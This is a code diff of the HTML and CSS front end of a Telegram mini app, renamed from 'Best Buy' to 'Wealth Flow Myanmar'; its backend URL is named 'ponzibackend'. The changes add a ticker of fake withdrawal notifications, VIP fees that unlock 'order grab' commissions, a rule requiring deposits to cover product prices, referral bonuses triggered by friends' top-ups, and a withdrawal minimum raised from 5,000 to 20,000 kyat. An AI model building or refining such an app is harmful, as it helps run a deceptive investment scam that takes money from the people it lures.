@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Best Buy Mini App</title>
+  <title>Wealth Flow Myanmar</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Myanmar:wght@400;600;700&family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet" />
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -68,7 +68,7 @@ html, body {
 .hero-banner {
   position: relative;
   width: 100%;
-  height: 200px;
+  height: 190px;
   background: linear-gradient(135deg, #1a0533 0%, #2d0b5e 30%, #0a0a2e 60%, #1a0040 100%);
   overflow: hidden;
   flex-shrink: 0;
@@ -93,7 +93,7 @@ html, body {
 }
 
 .hero-phone {
-  width: 175px; height: 132px;
+  width: 165px; height: 124px;
   background: linear-gradient(145deg, #efefef 0%, #ffffff 40%, #e5e5e5 100%);
   border-radius: 18px 18px 0 0;
   display: flex; align-items: center; justify-content: center;
@@ -112,7 +112,7 @@ html, body {
 
 .bb-tag {
   background: var(--yellow-bb);
-  width: 96px; height: 68px;
+  width: 96px; height: 64px;
   border-radius: 9px;
   display: flex; align-items: center; justify-content: center;
   position: relative;
@@ -130,7 +130,7 @@ html, body {
 
 .bb-text {
   font-family: 'Poppins', sans-serif;
-  font-size: 19px; font-weight: 800;
+  font-size: 15px; font-weight: 800;
   color: var(--blue-bb);
   text-align: center; line-height: 1.1;
   letter-spacing: -0.5px;
@@ -161,6 +161,42 @@ html, body {
   display: none; align-items: center; gap: 4px;
   z-index: 10;
 }
+
+/* ========================================
+   FAKE NOTIFICATION TICKER (Fix 5)
+======================================== */
+.fake-notif-ticker {
+  position: fixed; top: 0; left: 50%;
+  transform: translateX(-50%) translateY(-120%);
+  max-width: 480px; width: 100%;
+  background: linear-gradient(135deg, #1e0645, #2d0b5c);
+  border-bottom: 2px solid rgba(192,132,252,0.5);
+  padding: 10px 16px;
+  display: flex; align-items: center; gap: 10px;
+  z-index: 9000;
+  transition: transform 0.45s cubic-bezier(0.34,1.56,0.64,1);
+  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+}
+
+.fake-notif-ticker.show {
+  transform: translateX(-50%) translateY(0);
+}
+
+.fake-notif-icon {
+  width: 32px; height: 32px;
+  background: linear-gradient(135deg, #10b981, #059669);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  color: white; font-size: 14px; flex-shrink: 0;
+}
+
+.fake-notif-text {
+  font-size: 12.5px; color: rgba(255,255,255,0.9);
+  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  line-height: 1.4;
+}
+
+.fake-notif-text strong { color: #ffd700; }
 
 /* ========================================
    SCROLLABLE CONTENT
@@ -218,13 +254,13 @@ html, body {
 .menu-grid {
   display: grid;
   grid-template-columns: repeat(3, 1fr);
-  gap: 12px;
+  gap: 10px;
 }
 
 .menu-item {
   display: flex; flex-direction: column;
-  align-items: center; gap: 8px;
-  padding: 14px 8px;
+  align-items: center; gap: 7px;
+  padding: 13px 6px;
   border-radius: var(--radius-md);
   cursor: pointer;
   transition: all 0.2s ease;
@@ -235,16 +271,16 @@ html, body {
 .menu-item:active { transform: scale(0.93); background: var(--pink-light); }
 
 .menu-icon-wrap {
-  width: 46px; height: 46px;
+  width: 44px; height: 44px;
   background: linear-gradient(135deg, var(--pink-accent), var(--pink-soft));
   border-radius: 14px;
   display: flex; align-items: center; justify-content: center;
-  color: white; font-size: 18px;
+  color: white; font-size: 17px;
   box-shadow: 0 4px 12px rgba(233,30,99,0.3);
 }
 
 .menu-label {
-  font-size: 11px; font-weight: 600;
+  font-size: 10.5px; font-weight: 600;
   color: var(--text-dark); text-align: center;
   font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
   line-height: 1.3;
@@ -442,9 +478,16 @@ html, body {
   width: 120px; height: 120px;
   object-fit: cover;
   border-radius: var(--radius-md);
-  margin: 0 auto 12px;
+  margin: 0 auto 10px;
   display: block;
   box-shadow: var(--shadow-card);
+}
+
+.order-product-name {
+  font-size: 14px; font-weight: 700;
+  color: var(--text-dark);
+  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  margin-bottom: 4px;
 }
 
 .order-price {
@@ -475,6 +518,28 @@ html, body {
 }
 .submit-btn:active { transform: scale(0.96); }
 
+/* Balance needed alert inside order area */
+.order-balance-alert {
+  background: linear-gradient(135deg,#fff0f3,#ffe8ec);
+  border: 1.5px solid rgba(233,30,99,0.25);
+  border-radius: var(--radius-md);
+  padding: 14px 16px;
+  display: none;
+  flex-direction: column; gap: 8px;
+  animation: fadeUp 0.3s ease both;
+}
+.order-balance-alert.show { display: flex; }
+.order-alert-title {
+  font-size: 14px; font-weight: 700; color: var(--red);
+  font-family: 'Noto Sans Myanmar','Poppins',sans-serif;
+  display: flex; align-items: center; gap: 6px;
+}
+.order-alert-desc {
+  font-size: 12.5px; color: var(--text-mid);
+  font-family: 'Noto Sans Myanmar','Poppins',sans-serif;
+  line-height: 1.6;
+}
+
 .daily-counter {
   background: var(--white);
   border-radius: var(--radius-md);
@@ -496,7 +561,7 @@ html, body {
 }
 
 /* ========================================
-   VIP LOCK NOTICE (non-VIP users)
+   VIP LOCK NOTICE
 ======================================== */
 .vip-lock-notice {
   background: linear-gradient(135deg, #1a0533, #2d0b5e);
@@ -583,21 +648,22 @@ html, body {
 }
 
 .product-card-info {
-  padding: 10px 10px 12px;
-  display: flex; flex-direction: column; gap: 3px;
+  padding: 8px 10px 10px;
+  display: flex; flex-direction: column; gap: 2px;
 }
 
-.product-card-id {
-  font-size: 11px; font-weight: 700;
-  color: var(--pink-accent);
-  font-family: 'Poppins', sans-serif;
-  text-transform: uppercase;
+.product-card-name {
+  font-size: 11.5px; font-weight: 700;
+  color: var(--text-dark);
+  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  line-height: 1.3;
 }
 
 .product-card-label {
-  font-size: 12px;
-  color: var(--text-mid);
-  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  font-size: 10.5px;
+  color: var(--pink-accent);
+  font-family: 'Poppins', sans-serif;
+  font-weight: 600;
 }
 
 .vip-gallery-header {
@@ -625,26 +691,21 @@ html, body {
 }
 
 /* ========================================
-   VIP CARDS (VIP Tab)
+   VIP CARDS (VIP Tab) — CSS Grid Equal Layout
 ======================================== */
-/* VIP screen: 2-column grid for cards, then full-width note */
-.vip-screen { display: flex; flex-direction: column; gap: 16px; }
-
-/* Two-card row using CSS Grid for equal sizing */
 .vip-cards-grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
   gap: 12px;
-  align-items: start;
+  align-items: stretch;
 }
 
 .vip-card {
   border-radius: var(--radius-lg);
-  padding: 18px 14px;
+  padding: 16px 12px;
   box-shadow: var(--shadow-card);
   position: relative; overflow: hidden;
   animation: fadeUp 0.4s ease both;
-  /* Ensure cards are same height */
   display: flex;
   flex-direction: column;
 }
@@ -663,96 +724,91 @@ html, body {
 .vip-card::before {
   content: ''; position: absolute; top: -30px; right: -20px;
   width: 100px; height: 100px; border-radius: 50%;
-  background: rgba(255,255,255,0.1);
+  background: rgba(255,255,255,0.08);
 }
 
-/* Badge: same size & padding in both cards */
 .vip-badge {
-  display: inline-flex; align-items: center; justify-content: center; gap: 5px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 4px;
   background: rgba(255,255,255,0.2);
   backdrop-filter: blur(8px);
   border-radius: 50px;
-  padding: 4px 10px;
-  font-size: 11.5px; font-weight: 700;
-  margin-bottom: 10px;
+  padding: 4px 9px;
+  font-size: 11px; font-weight: 700;
+  margin-bottom: 9px;
   white-space: nowrap;
   text-align: center;
+  align-self: flex-start;
 }
 
-/* VIP name centered & same size */
 .vip-name {
-  font-size: 20px; font-weight: 800;
+  font-size: 19px; font-weight: 800;
   font-family: 'Poppins', sans-serif;
   margin-bottom: 6px;
   text-align: center;
 }
 
-/* Price block: centered, equal sizing */
 .vip-price-box {
   background: rgba(255,255,255,0.1);
   border-radius: 10px;
-  padding: 8px 10px;
+  padding: 7px 8px;
   text-align: center;
   margin-bottom: 4px;
 }
 .vip-price-label {
-  font-size: 10.5px;
+  font-size: 10px;
   opacity: 0.75;
   font-family: 'Noto Sans Myanmar','Poppins',sans-serif;
   margin-bottom: 2px;
 }
 .vip-price-amount {
-  font-size: 18px; font-weight: 900;
+  font-size: 17px; font-weight: 900;
   font-family: 'Poppins', sans-serif;
   color: #ffd700;
   line-height: 1.2;
 }
 .vip-price-currency {
-  font-size: 12px; font-weight: 600;
+  font-size: 11px; font-weight: 600;
   opacity: 0.85;
   font-family: 'Noto Sans Myanmar','Poppins',sans-serif;
 }
 
-/* Compare hint */
 .vip-compare-hint {
-  font-size: 10.5px;
+  font-size: 10px;
   text-align: center;
-  margin: 4px 0 6px;
-  min-height: 14px;
+  margin: 3px 0 5px;
+  min-height: 13px;
   font-family: 'Noto Sans Myanmar','Poppins',sans-serif;
   line-height: 1.4;
 }
 
-/* Features list: flex-grow fills space so button stays at bottom */
 .vip-features {
-  margin: 10px 0 12px;
-  display: flex; flex-direction: column; gap: 7px;
+  margin: 8px 0 10px;
+  display: flex; flex-direction: column; gap: 6px;
   flex-grow: 1;
 }
 
 .vip-feature {
-  display: flex; align-items: flex-start; gap: 6px;
-  font-size: 11.5px;
+  display: flex; align-items: flex-start; gap: 5px;
+  font-size: 10.5px;
   font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
   line-height: 1.4;
 }
 
-.vip-feature i { font-size: 12px; flex-shrink: 0; margin-top: 1px; }
+.vip-feature i { font-size: 11px; flex-shrink: 0; margin-top: 1px; }
 
-/* VIP Buy Button - always visible, never balance-gated */
 .vip-buy-btn {
   background: rgba(255,255,255,0.22);
   backdrop-filter: blur(8px);
   border: 1.5px solid rgba(255,255,255,0.5);
   color: white;
-  padding: 11px 10px;
+  padding: 10px 8px;
   border-radius: 50px;
-  font-size: 12.5px; font-weight: 700;
+  font-size: 12px; font-weight: 700;
   font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
   cursor: pointer;
   width: 100%;
   transition: all 0.2s ease;
-  display: flex; align-items: center; justify-content: center; gap: 6px;
+  display: flex; align-items: center; justify-content: center; gap: 5px;
   text-align: center;
   margin-top: auto;
 }
@@ -762,19 +818,55 @@ html, body {
   border-color: rgba(16,185,129,0.7);
   cursor: default;
 }
-/* NOTE: .vip-buy-btn:disabled removed intentionally — button always shows */
 .vip-buy-btn.loading { opacity: 0.75; cursor: wait; }
 
-/* VIP cost breakdown hint */
-.vip-balance-hint {
-  font-size: 11px; opacity: 0.75;
+/* ========================================
+   INSUFFICIENT BALANCE ALERT
+======================================== */
+.insufficient-card {
+  background: linear-gradient(135deg, #fff0f3, #ffe8ec);
+  border: 1.5px solid rgba(233,30,99,0.25);
+  border-radius: var(--radius-md);
+  padding: 14px;
   margin-top: 8px;
-  text-align: center;
-  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  display: none;
+  flex-direction: column; gap: 8px;
+  animation: fadeUp 0.3s ease both;
 }
 
+.insufficient-card.show { display: flex; }
+
+.insufficient-title {
+  font-size: 13px; font-weight: 700;
+  color: var(--red);
+  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  display: flex; align-items: center; gap: 6px;
+}
+
+.insufficient-desc {
+  font-size: 12px;
+  color: var(--text-mid);
+  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  line-height: 1.6;
+}
+
+.topup-now-btn {
+  background: linear-gradient(135deg, var(--pink-accent), var(--pink-deep));
+  color: white;
+  border: none; outline: none;
+  padding: 11px 18px;
+  border-radius: 50px;
+  font-size: 12.5px; font-weight: 700;
+  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center; gap: 6px;
+  box-shadow: 0 4px 12px rgba(233,30,99,0.3);
+  transition: all 0.2s ease;
+}
+.topup-now-btn:active { transform: scale(0.96); }
+
 /* ========================================
-   PAYMENT MODAL (Topup)
+   PAYMENT MODAL
 ======================================== */
 .modal-overlay {
   position: fixed; inset: 0;
@@ -1011,9 +1103,35 @@ html, body {
   color: var(--text-dark);
   font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
   display: flex; align-items: center; gap: 8px;
-  margin-bottom: 12px;
+  margin-bottom: 10px;
 }
 .referral-title i { color: var(--pink-accent); }
+
+/* Referral bonus tiers card */
+.referral-bonus-tiers {
+  background: linear-gradient(135deg,#fff8cc,#fff0f3);
+  border: 1px solid rgba(233,30,99,0.15);
+  border-radius: var(--radius-sm);
+  padding: 12px 14px;
+  margin-bottom: 12px;
+}
+
+.bonus-tier-row {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 4px 0;
+  font-size: 12px;
+  font-family: 'Noto Sans Myanmar','Poppins',sans-serif;
+  color: var(--text-dark);
+}
+
+.bonus-tier-row:not(:last-child) {
+  border-bottom: 1px dashed rgba(233,30,99,0.15);
+  padding-bottom: 7px; margin-bottom: 4px;
+}
+
+.bonus-tier-amount {
+  font-weight: 800; color: var(--green);
+}
 
 .referral-link-box {
   background: var(--pink-light);
@@ -1054,7 +1172,7 @@ html, body {
 }
 
 /* ========================================
-   WITHDRAW / INPUT
+   INPUT / FORM
 ======================================== */
 .input-group { margin-bottom: 14px; }
 
@@ -1115,51 +1233,6 @@ html, body {
 .toast.warning { background: rgba(245,158,11,0.95); }
 
 /* ========================================
-   INSUFFICIENT BALANCE ALERT
-======================================== */
-.insufficient-card {
-  background: linear-gradient(135deg, #fff0f3, #ffe8ec);
-  border: 1.5px solid rgba(233,30,99,0.25);
-  border-radius: var(--radius-md);
-  padding: 16px;
-  margin-top: 10px;
-  display: none;
-  flex-direction: column; gap: 8px;
-  animation: fadeUp 0.3s ease both;
-}
-
-.insufficient-card.show { display: flex; }
-
-.insufficient-title {
-  font-size: 14px; font-weight: 700;
-  color: var(--red);
-  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
-  display: flex; align-items: center; gap: 6px;
-}
-
-.insufficient-desc {
-  font-size: 12.5px;
-  color: var(--text-mid);
-  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
-  line-height: 1.6;
-}
-
-.topup-now-btn {
-  background: linear-gradient(135deg, var(--pink-accent), var(--pink-deep));
-  color: white;
-  border: none; outline: none;
-  padding: 12px 20px;
-  border-radius: 50px;
-  font-size: 13px; font-weight: 700;
-  font-family: 'Noto Sans Myanmar', 'Poppins', sans-serif;
-  cursor: pointer;
-  display: flex; align-items: center; justify-content: center; gap: 6px;
-  box-shadow: 0 4px 12px rgba(233,30,99,0.3);
-  transition: all 0.2s ease;
-}
-.topup-now-btn:active { transform: scale(0.96); }
-
-/* ========================================
    ANIMATIONS
 ======================================== */
 @keyframes fadeUp {
@@ -1176,6 +1249,11 @@ html, body {
 
 @keyframes spin { to { transform: rotate(360deg); } }
 
+@keyframes slideDown {
+  from { transform: translateX(-50%) translateY(-120%); }
+  to   { transform: translateX(-50%) translateY(0); }
+}
+
 /* iOS safe area */
 @supports (padding-bottom: env(safe-area-inset-bottom)) {
   .bottom-nav {
@@ -1187,9 +1265,8 @@ html, body {
   }
 }
 
-/* Spinner */
 .spinner {
-  width: 20px; height: 20px;
+  width: 18px; height: 18px;
   border: 2.5px solid rgba(255,255,255,0.4);
   border-top-color: white;
   border-radius: 50%;
@@ -1200,6 +1277,15 @@ html, body {
 </head>
 
 <body>
+
+<!-- ===== Fake Withdrawal Notification Ticker (Fix 5) ===== -->
+<div class="fake-notif-ticker" id="fake-notif-ticker">
+  <div class="fake-notif-icon"><i class="fa-solid fa-circle-arrow-up"></i></div>
+  <div class="fake-notif-text" id="fake-notif-text">
+    +959*******96 က <strong>5,000 ကျပ်</strong> ထုတ်ယူသွားပြီ ✅
+  </div>
+</div>
+
 <div class="app-wrapper">
 
   <!-- ===== HERO BANNER ===== -->
@@ -1209,7 +1295,7 @@ html, body {
     <div class="hero-phone-wrap">
       <div class="hero-phone">
         <div class="bb-tag">
-          <span class="bb-text">BEST<br>BUY</span>
+          <span class="bb-text">WEALTH<br>FLOW</span>
         </div>
       </div>
     </div>
@@ -1228,7 +1314,7 @@ html, body {
 
     <div class="notification-bar">
       <div class="notif-icon"><i class="fa-solid fa-bell"></i></div>
-      <p class="notif-text" id="notif-text">🎉 မင်္ဂလာပါ! Best Buy Mini App မှ ကြိုဆိုပါသည်</p>
+      <p class="notif-text" id="notif-text">🎉 မင်္ဂလာပါ! Wealth Flow Myanmar မှ ကြိုဆိုပါသည်</p>
     </div>
 
     <div class="menu-card">
@@ -1241,7 +1327,7 @@ html, body {
           <div class="menu-icon-wrap"><i class="fa-solid fa-wallet"></i></div>
           <span class="menu-label">လက်ကျန်ငွေ</span>
         </div>
-        <div class="menu-item" onclick="copyReferral()">
+        <div class="menu-item" onclick="shareReferral()">
           <div class="menu-icon-wrap"><i class="fa-solid fa-user-plus"></i></div>
           <span class="menu-label">လူဖိတ်ရန်</span>
         </div>
@@ -1302,24 +1388,23 @@ html, body {
       Order Grab
     </div>
 
-    <!-- VIP Lock Notice (shown when vip_level === 0) -->
+    <!-- VIP Lock Notice -->
     <div class="vip-lock-notice" id="vip-lock-notice">
       <div class="lock-icon"><i class="fa-solid fa-lock"></i></div>
       <div class="lock-title">VIP ဝယ်ယူပါ</div>
       <div class="lock-desc">
-        လုပ်ငန်းစဉ်စတင်ရန် VIP ဝယ်ယူပါ<br>
+        လုပ်ငန်းစတင်ရန် VIP ဝယ်ယူပါ<br>
         VIP-1: ၅,၀၀၀ ကျပ် | VIP-2: ၂၀,၀၀၀ ကျပ်<br>
-        Order Grab လုပ်ကာ နေ့စဉ် Commission ရရှိမည်
+        Order Grab → နေ့စဉ် Commission ရရှိမည်
       </div>
       <button class="lock-btn" onclick="navTo('vip')">
         <i class="fa-solid fa-gem"></i> VIP ဝယ်ယူရန်
       </button>
     </div>
 
-    <!-- VIP Product Gallery (shown when vip_level > 0) -->
+    <!-- VIP Product Gallery -->
     <div class="vip-products-section" id="vip-products-section">
 
-      <!-- Gallery Header -->
       <div class="vip-gallery-header">
         <div class="vip-gallery-badge" id="gallery-vip-badge">VIP-1</div>
         <div class="vip-gallery-text" id="gallery-vip-text">
@@ -1346,9 +1431,24 @@ html, body {
         </button>
       </div>
 
+      <!-- Insufficient Balance for Order -->
+      <div class="order-balance-alert" id="order-balance-alert">
+        <div class="order-alert-title">
+          <i class="fa-solid fa-triangle-exclamation"></i>
+          Balance မလုံလောက်ပါ
+        </div>
+        <div class="order-alert-desc" id="order-alert-desc">
+          ပစ္စည်းဈေးနှုန်း ပေးဆောင်ရန် Balance မလုံလောက်ပါ
+        </div>
+        <button class="topup-now-btn" onclick="hideOrderAlert(); openTopup();">
+          <i class="fa-solid fa-circle-plus"></i> ငွေဖြည့်ရန်
+        </button>
+      </div>
+
       <!-- Order Result -->
       <div class="order-result-card" id="order-result">
         <img class="order-img" id="order-img" src="" alt="product" />
+        <div class="order-product-name" id="order-product-name"></div>
         <div class="order-price"><span id="order-price">0</span> ကျပ်</div>
         <div class="order-commission">
           🎉 Commission: +<span id="order-commission">0</span> ကျပ် (10%)
@@ -1363,19 +1463,16 @@ html, body {
         <i class="fa-solid fa-images"></i>
         <span id="gallery-title">VIP-1 ပစ္စည်းများ</span>
       </div>
-      <div class="products-grid" id="products-grid">
-        <!-- Dynamically filled by JS -->
-      </div>
+      <div class="products-grid" id="products-grid"></div>
 
       <!-- Info Card -->
       <div class="history-card">
-        <div class="history-title"><i class="fa-solid fa-circle-info"></i> အကြောင်းအရာ</div>
-        <div style="font-size:13px;color:var(--text-mid);font-family:'Noto Sans Myanmar','Poppins',sans-serif;line-height:1.7;">
-          ✅ Grab Order နှိပ်လိုက်ပါ<br>
-          ✅ ပစ္စည်း ကျပန်းကျမည်<br>
-          ✅ Submit နှိပ်ရင် Commission ရမည်<br>
-          ✅ VIP-1: နေ့စဉ် ၁၀ ကြိမ်<br>
-          ✅ VIP-2: နေ့စဉ် ၂၀ ကြိမ်
+        <div class="history-title"><i class="fa-solid fa-circle-info"></i> လုပ်နည်း</div>
+        <div style="font-size:12.5px;color:var(--text-mid);font-family:'Noto Sans Myanmar','Poppins',sans-serif;line-height:1.7;">
+          ✅ <strong>Grab Order</strong> နှိပ်ပါ - ပစ္စည်း ကျပန်းကျမည်<br>
+          💰 ပစ္စည်းဈေးနှုန်း Balance ထဲ ရှိမှသာ Grab ရသည်<br>
+          🎉 <strong>Submit</strong> နှိပ်ရင် ဈေးနှုတ်ပြီး Commission (10%) ရမည်<br>
+          ✅ VIP-1: နေ့စဉ် ၁၀ ကြိမ် | VIP-2: ၂၀ ကြိမ်
         </div>
       </div>
 
@@ -1391,8 +1488,8 @@ html, body {
       VIP အဆင့်
     </div>
 
-    <!-- လက်ရှိ လက်ကျန်ငွေ ပြပေးသည် -->
-    <div style="background:linear-gradient(135deg,#1a0533,#2d0b5c);border:1px solid rgba(180,100,255,0.35);border-radius:16px;padding:18px 20px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;">
+    <!-- Balance Display -->
+    <div style="background:linear-gradient(135deg,#1a0533,#2d0b5c);border:1px solid rgba(180,100,255,0.35);border-radius:16px;padding:16px 18px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;">
       <div>
         <div style="font-size:11.5px;color:#b89adf;font-family:'Noto Sans Myanmar','Poppins',sans-serif;margin-bottom:4px;">💳 လက်ရှိ လက်ကျန်ငွေ</div>
         <div style="font-size:22px;font-weight:800;color:#fff;font-family:'Poppins',sans-serif;">
@@ -1405,7 +1502,7 @@ html, body {
       </div>
     </div>
 
-    <!-- VIP Cards Grid: 2 columns equal size -->
+    <!-- VIP Cards Grid -->
     <div class="vip-cards-grid">
 
       <!-- VIP-1 Card -->
@@ -1427,7 +1524,7 @@ html, body {
           💳 ဝယ်မည်
         </button>
         <div class="insufficient-card" id="vip1-insufficient">
-          <div class="insufficient-title"><i class="fa-solid fa-triangle-exclamation"></i> လက်ကျန်ငွေ မလုံလောက်ပါ</div>
+          <div class="insufficient-title"><i class="fa-solid fa-triangle-exclamation"></i> Balance မလုံလောက်</div>
           <div class="insufficient-desc" id="vip1-insufficient-desc">ကျေးဇူးပြု၍ ငွေဖြည့်ပါ</div>
           <button class="topup-now-btn" onclick="closeVIPInsufficient(1); openTopup();">
             <i class="fa-solid fa-circle-plus"></i> ငွေဖြည့်ရန်
@@ -1454,7 +1551,7 @@ html, body {
           💳 ဝယ်မည်
         </button>
         <div class="insufficient-card" id="vip2-insufficient">
-          <div class="insufficient-title"><i class="fa-solid fa-triangle-exclamation"></i> လက်ကျန်ငွေ မလုံလောက်ပါ</div>
+          <div class="insufficient-title"><i class="fa-solid fa-triangle-exclamation"></i> Balance မလုံလောက်</div>
           <div class="insufficient-desc" id="vip2-insufficient-desc">ကျေးဇူးပြု၍ ငွေဖြည့်ပါ</div>
           <button class="topup-now-btn" onclick="closeVIPInsufficient(2); openTopup();">
             <i class="fa-solid fa-circle-plus"></i> ငွေဖြည့်ရန်
@@ -1467,9 +1564,9 @@ html, body {
     <div class="history-card">
       <div class="history-title"><i class="fa-solid fa-circle-info"></i> မှတ်ချက်</div>
       <div style="font-size:12.5px;color:var(--text-mid);font-family:'Noto Sans Myanmar','Poppins',sans-serif;line-height:1.7;">
-        ⚡ VIP ဝယ်ယူပြီးသည်နှင့် ချက်ချင်း Balance မှ နှုတ်ပြီး Order Grab လုပ်နိုင်ပြီ<br>
-        💰 ငွေ မလုံလောက်ပါက ပိုက်ဆံသွင်းပြီး VIP ဝယ်ပါ<br>
-        📲 Admin မှ /setvip command ဖြင့်လည်း VIP သတ်မှတ်ပေးနိုင်သည်
+        ⚡ VIP ဝယ်ပြီးသည်နှင့် Balance မှ ချက်ချင်း နှုတ်မည်<br>
+        💰 Order Grab တိုင်း ပစ္စည်းဈေးနှုန်း Balance ထဲ ရှိမှ Grab ရ<br>
+        📲 Admin မှ /setvip command ဖြင့် VIP သတ်မှတ်ပေးနိုင်
       </div>
     </div>
 
@@ -1480,7 +1577,10 @@ html, body {
     <div style="background:linear-gradient(145deg,#1e0645,#2d0b5c);border:2px solid #c084fc;border-radius:24px;padding:32px 28px;max-width:320px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(192,132,252,0.4);">
       <div style="font-size:52px;margin-bottom:12px;">🎉</div>
       <div id="vip-success-title" style="font-size:18px;font-weight:800;color:#fff;font-family:'Noto Sans Myanmar','Poppins',sans-serif;margin-bottom:8px;"></div>
-      <div style="font-size:13px;color:#c084fc;font-family:'Noto Sans Myanmar','Poppins',sans-serif;margin-bottom:20px;line-height:1.6;">Balance မှ <strong id="vip-success-cost" style="color:#ffd700;"></strong> နှုတ်ယူပြီးပါပြီ။<br>ယခု Order Grab လုပ်နိုင်ပါပြီ!</div>
+      <div style="font-size:13px;color:#c084fc;font-family:'Noto Sans Myanmar','Poppins',sans-serif;margin-bottom:20px;line-height:1.6;">
+        Balance မှ <strong id="vip-success-cost" style="color:#ffd700;"></strong> နှုတ်ပြီးပါပြီ<br>
+        ယခု Order Grab လုပ်နိုင်ပါပြီ!
+      </div>
       <button onclick="closeVIPSuccessPopup()" style="background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;border:none;border-radius:12px;padding:13px 32px;font-size:14px;font-weight:700;cursor:pointer;width:100%;font-family:'Noto Sans Myanmar','Poppins',sans-serif;">
         <i class="fa-solid fa-cart-shopping"></i> Order Tab သို့ သွားမည်
       </button>
@@ -1520,17 +1620,32 @@ html, body {
         <i class="fa-solid fa-link"></i>
         Referral Link - မိတ်ဆွေဖိတ်ကြားရန်
       </div>
-      <div style="font-size:12px;color:var(--text-mid);font-family:'Noto Sans Myanmar',sans-serif;margin-bottom:10px;line-height:1.6;">
-        🎁 သင်ဖိတ်ကြားသော မိတ်ဆွေ App ဖွင့်တိုင်း <strong style="color:var(--pink-accent)">၁,၀၀၀ ကျပ်</strong> Bonus ရရှိမည်
+
+      <!-- Referral Bonus Tiers (Fix 3) -->
+      <div class="referral-bonus-tiers">
+        <div style="font-size:12.5px;font-weight:700;color:var(--text-dark);margin-bottom:8px;font-family:'Noto Sans Myanmar','Poppins',sans-serif;">
+          🎁 သင်ဖိတ်ကြားသူ ငွေဖြည့်လိုက်ရင် Bonus ရမည်:
+        </div>
+        <div class="bonus-tier-row">
+          <span>မိတ်ဆွေ ၅,၀၀၀ ကျပ် ဖြည့်ရင်</span>
+          <span class="bonus-tier-amount">+ ၁,၀၀၀ ကျပ်</span>
+        </div>
+        <div class="bonus-tier-row">
+          <span>မိတ်ဆွေ ၂၀,၀၀၀ ကျပ် ဖြည့်ရင်</span>
+          <span class="bonus-tier-amount">+ ၄,၀၀၀ ကျပ်</span>
+        </div>
       </div>
+
       <div class="referral-link-box">
         <span class="referral-link-text" id="referral-link">https://t.me/yourbot?start=ref_0000</span>
         <button class="copy-btn" onclick="copyReferral()" id="copy-ref-btn">
           <i class="fa-solid fa-copy"></i> Copy
         </button>
       </div>
+
+      <!-- Fix 4: Telegram Share with openTelegramLink -->
       <button class="profile-action-btn" onclick="shareReferral()">
-        <i class="fa-solid fa-share-nodes"></i> မိတ်ဆွေများဆီ Share လုပ်မည်
+        <i class="fa-brands fa-telegram"></i> Contacts တွေဆီ Share လုပ်မည်
       </button>
     </div>
 
@@ -1613,15 +1728,15 @@ html, body {
     <div class="payment-steps">
       <div class="payment-step">
         <div class="payment-step-num">1</div>
-        <span>အထက်ပါ KPay သို့မဟုတ် Wave နံပါတ်သို့ ငွေလွှဲပါ</span>
+        <span>KPay သို့မဟုတ် Wave သို့ ငွေလွှဲပါ</span>
       </div>
       <div class="payment-step">
         <div class="payment-step-num">2</div>
-        <span>ငွေပမာဏ ဖြည့်ပြီး "အတည်ပြုမည်" ခလုတ်နှိပ်ပါ</span>
+        <span>ငွေပမာဏ ဖြည့်ပြီး "အတည်ပြုမည်" နှိပ်ပါ</span>
       </div>
       <div class="payment-step">
         <div class="payment-step-num">3</div>
-        <span>Admin မှ စစ်ဆေးပြီး ၁-၂ နာရီအတွင်း Balance ဖြည့်ပေးပါမည်</span>
+        <span>Admin မှ ၁-၂ နာရီအတွင်း Balance ဖြည့်ပေးပါမည်</span>
       </div>
     </div>
 
@@ -1645,7 +1760,8 @@ html, body {
 
     <div class="input-group">
       <label class="input-label">ထုတ်ယူမည့် ပမာဏ (ကျပ်)</label>
-      <input class="input-field" type="number" id="withdraw-amount" placeholder="အနည်းဆုံး ၅,၀၀၀ ကျပ်" min="5000" />
+      <input class="input-field" type="number" id="withdraw-amount"
+        placeholder="အနည်းဆုံး ၂၀,၀၀၀ ကျပ်" min="20000" />
     </div>
 
     <div class="input-group">
@@ -1664,7 +1780,7 @@ html, body {
     <div class="payment-steps">
       <div class="payment-step">
         <div class="payment-step-num">!</div>
-        <span>ငွေထုတ်တောင်းဆိုမှုသည် Admin စစ်ဆေးမှုပြီးမှ ၂-၂၄ နာရီအတွင်း လုပ်ဆောင်ပေးမည်</span>
+        <span>အနည်းဆုံး <strong>၂၀,၀၀၀ ကျပ်</strong> မှသာ ထုတ်ယူနိုင်သည်</span>
       </div>
     </div>
 
@@ -1677,19 +1793,26 @@ html, body {
 
 <script>
 // ================================================
-//   Best Buy Mini App - Frontend v4
-//   Backend URL: https://ponzibackend.onrender.com
-//   Features: Instant VIP buy, DOM update,
-//             Product gallery by VIP level,
-//             Access control, Error toasts
+//   Wealth Flow Myanmar - Frontend v5
+//   Backend: https://ponzibackend.onrender.com
 // ================================================
